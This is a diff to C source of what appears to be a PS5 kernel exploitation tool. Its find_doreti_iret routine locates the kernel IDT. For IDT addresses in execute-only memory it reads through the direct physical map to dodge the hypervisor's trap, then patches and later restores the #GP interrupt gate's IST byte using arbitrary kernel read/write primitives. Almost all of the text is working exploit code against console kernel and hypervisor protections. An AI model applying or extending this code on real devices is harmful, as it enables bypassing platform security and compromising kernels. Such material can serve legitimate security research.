@@ -3331,10 +3331,12 @@ cmd_find_doreti_iret(int sock, const char *arg)
     send_response(sock, "--- Step 1: IDT Discovery ---\n");
 
     uint64_t idt_base = 0;
+    uint64_t idt_access = 0; /* address for kernel read/write (may differ from idt_base if DMAP) */
     int found_idt = 0;
 
     if (find_idt_base(sock, &idt_base) == 0) {
         found_idt = 1;
+        idt_access = idt_base; /* in .data — directly accessible */
         send_response(sock, "IDT base: 0x%lx\n", idt_base);
     } else {
         send_response(sock, "IDT not found (HV-managed?) - skipping to broad scan\n");
@@ -4084,6 +4086,7 @@ broad_done:
             uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
             uint64_t scan_size = 0x4000000; /* 64MB: matches TSS scan range */
             uint64_t dmap_base = get_dmap_base();
+            uint64_t pm_cr3 = get_kernel_cr3();
             uint8_t page[4096];
             int idt_found = 0;
             int ridt_candidates_total = 0;
@@ -4111,22 +4114,28 @@ broad_done:
                         continue;
 
                     ridt_candidates_total++;
-                    /* IDT must be at least 16-byte aligned; prefer
-                     * page-aligned first pass, fall back later. */
+                    /* IDT entries are 16 bytes; base must be aligned. */
                     if (base & 0xF)
                         continue;
-                    /* Exclude .text range — XOM on PS5, reading
-                     * causes kernel panic via hypervisor. */
-                    if (base >= ktext && base < kdata) {
-                        ridt_candidates_rejected++;
-                        continue;
-                    }
 
-                    /* Candidate r_idt: validate by reading IDT gates.
-                     * kernel_copyout returns non-zero for unmapped
-                     * addresses without panicking. */
+                    /* Read IDT gates from candidate base.
+                     * For addresses in the ktext..kdata range (may be
+                     * XOM), translate to physical and read via DMAP to
+                     * avoid hypervisor trap on direct read. */
                     uint8_t gates[64]; /* first 4 entries */
-                    if (kernel_copyout(base, gates, 64) != 0) {
+                    int read_ok = 0;
+                    if (base >= ktext && base < kdata) {
+                        uint64_t paddr;
+                        if (vaddr_to_paddr_quiet(dmap_base, pm_cr3,
+                                                 base, &paddr,
+                                                 NULL) == 0) {
+                            read_ok = (kernel_copyout(
+                                dmap_base + paddr, gates, 64) == 0);
+                        }
+                    } else {
+                        read_ok = (kernel_copyout(base, gates, 64) == 0);
+                    }
+                    if (!read_ok) {
                         ridt_candidates_rejected++;
                         continue;
                     }
@@ -4161,13 +4170,25 @@ broad_done:
                     if (valid >= 3) {
                         idt_base = base;
                         idt_found = 1;
+                        /* Set access address: use DMAP for XOM range */
+                        if (base >= ktext && base < kdata) {
+                            uint64_t pa;
+                            if (vaddr_to_paddr_quiet(dmap_base, pm_cr3,
+                                                     base, &pa,
+                                                     NULL) == 0)
+                                idt_access = dmap_base + pa;
+                            else
+                                idt_access = base; /* shouldn't happen */
+                        } else {
+                            idt_access = base;
+                        }
                         uint16_t sel;
                         memcpy(&sel, gates + 2, 2);
                         send_response(sock,
                             "  r_idt at kdata+0x%lx: limit=0x%x "
-                            "base=0x%lx (CS=0x%04x)\n",
+                            "base=0x%lx access=0x%lx (CS=0x%04x)\n",
                             (unsigned long)(addr + off - kdata),
-                            limit, base, sel);
+                            limit, base, idt_access, sel);
                     } else if (ridt_probed <= 10) {
                         send_response(sock,
                             "  r_idt probe: base=0x%lx "
@@ -4222,6 +4243,7 @@ broad_done:
                         }
                         if (valid >= 3) {
                             idt_base = addr + poff;
+                            idt_access = idt_base; /* in .data — direct */
                             idt_found = 1;
                             uint16_t sel;
                             memcpy(&sel, page + poff + 2, 2);
@@ -4251,7 +4273,7 @@ broad_done:
         /* Read #GP gate (vector 13) */
         {
             uint8_t gp_gate[16];
-            if (kernel_copyout(idt_base + 13 * 16, gp_gate, 16) != 0) {
+            if (kernel_copyout(idt_access + 13 * 16, gp_gate, 16) != 0) {
                 send_response(sock, "  Cannot read #GP gate\n");
                 goto step7_cleanup;
             }
@@ -4301,9 +4323,9 @@ broad_done:
         if (gp_ist_index == 0) {
             /* #GP gate has no IST — patch it to use IST7 */
             send_response(sock, "  #GP gate IST=0; patching to IST7\n");
-            if (kernel_copyout(idt_base + 13 * 16, idt_gate_saved, 16) == 0) {
+            if (kernel_copyout(idt_access + 13 * 16, idt_gate_saved, 16) == 0) {
                 uint8_t new_ist_byte = (idt_gate_saved[4] & 0xF8) | 7;
-                kernel_setchar(idt_base + 13 * 16 + 4, new_ist_byte);
+                kernel_setchar(idt_access + 13 * 16 + 4, new_ist_byte);
                 idt_gate_modified = 1;
                 gp_ist_index = 7;
                 send_response(sock, "  Patched #GP gate IST: 0 -> 7\n");
@@ -4555,7 +4577,7 @@ broad_done:
                 }
                 /* Cleanup IDT gate */
                 if (idt_gate_modified) {
-                    kernel_setchar(idt_base + 13 * 16 + 4, idt_gate_saved[4]);
+                    kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
                     idt_gate_modified = 0;
                 }
                 /* Restore SIGBUS */
@@ -4643,7 +4665,7 @@ broad_done:
 
         /* Restore IDT gate */
         if (idt_gate_modified) {
-            kernel_setchar(idt_base + 13 * 16 + 4, idt_gate_saved[4]);
+            kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
             send_response(sock, "  Restored #GP gate IST byte\n");
         }
 
